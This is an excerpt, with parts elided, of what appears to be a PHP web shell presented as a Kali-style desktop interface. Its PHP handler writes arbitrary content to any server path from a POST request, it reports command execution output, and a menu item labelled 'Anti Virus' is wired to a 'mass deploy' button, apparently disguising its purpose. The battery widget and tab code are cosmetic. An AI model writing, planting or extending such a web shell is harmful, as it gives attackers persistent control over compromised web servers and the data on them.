...
function sanitizeOutput($output) {
    if ($output === null || $output === '') return 'Command executed successfully (no output)';
    return htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
}

// Handle file creation via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
    ...
    if (!empty($filepath)) {
        ...
        if (@file_put_contents($filepath, $content)) {
            echo json_encode(['success' => true, 'message' => 'File created: ' . $filepath]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to create file']);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'No filepath provided']);
    }
    exit;
}
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        ...
        .battery-level.low { background: #ff4444; }
        .battery-level.medium { background: #ffaa33; }
        .battery-level.high { background: #33ff33; }
        .battery-percent {
            font-size: 0.65rem;
            color: #fff;
            margin-left: 2px;
...
<body>
    ...
    <div class="nav-menu" id="navMenu">
        <div class="nav-top">
            ...
            <div class="nav-item-text" id="navMassDeployBtn"><i class="fas fa-shield-alt"></i> Anti Virus</div>
    ...
    <div id="fileUploadPanel" class="file-upload-panel">
        <div class="file-upload-header">
            <h3><i class="fas fa-upload"></i> Create / Upload File</h3>
            <span class="close-upload" id="closeUploadPanel">&times;</span>
        </div>
        <div class="file-upload-body">
            <input type="text" id="uploadFilepath" placeholder="File path (e.g., /home/user/file.html)">
    ...
    (function(){
            ...
            if('getBattery' in navigator){
                navigator.getBattery().then(function(battery){
                    function updateUI(){
                        ...
                        let levelClass = '';
                        if(level <= 15) levelClass = 'low';
                        else if(level <= 50) levelClass = 'medium';
                        else levelClass = 'high';
                        
                        let batteryHTML = `
                            <div class="battery-container">
                                <div class="battery-icon">
                                    <div class="battery-level ${levelClass}" style="width: ${level}%;"></div>
                                </div>
                                <span class="battery-percent">${level}%</span>
                                <i class="fas fa-bolt charging-icon ${isCharging ? 'charging' : ''}"></i>
                            </div>
                        `;
                        statusDiv.innerHTML = batteryHTML;
                        statusDiv.title = isCharging ? `Charging: ${level}% remaining` : `Battery: ${level}% remaining`;
                    }
                    updateUI();
            ...
            if(statusDiv){
                let batteryHTML = `
                    <div class="battery-container">
                        ...
                        <span class="battery-percent">75%</span>
        ...
        const uploadFilepath = document.getElementById('uploadFilepath');
        ...
        createFileBtn?.addEventListener('click', async () => {
            const filepath = uploadFilepath.value.trim();
            ...
            try {
                const response = await fetch(window.location.href, {
                    ...
                    body: 'create_file=1&filepath=' + encodeURIComponent(filepath) + '&content=' + encodeURIComponent(content)
                });
                const data = await response.json();
                if (data.success) {
                    showToast('File created: ' + filepath);
                    closeUploadPanelFn();
                    if (filepath.indexOf('/') !== -1) {
                        const filename = filepath.split('/').pop();
                        addDesktopItem('file', filename, { content: content });
                    }
                } else {
        ...
        function saveTabs(){ let tabs=[]; document.querySelectorAll('.app-tab').forEach(tab=>{ tabs.push({title:tab.querySelector('span')?.innerText, url:tab.getAttribute('data-url'), icon:tab.querySelector('i')?.className}); }); localStorage.setItem('kali_tabs_final_v15',JSON.stringify(tabs)); }
        
        function loadTabs(){ let saved=localStorage.getItem('kali_tabs_final_v15'); if(saved){ let tabs=JSON.parse(saved); tabs.forEach(t=>{ if(t.url && t.url!=='#') addTab(t.title, t.icon||'fab fa-chrome', t.url); }); } }
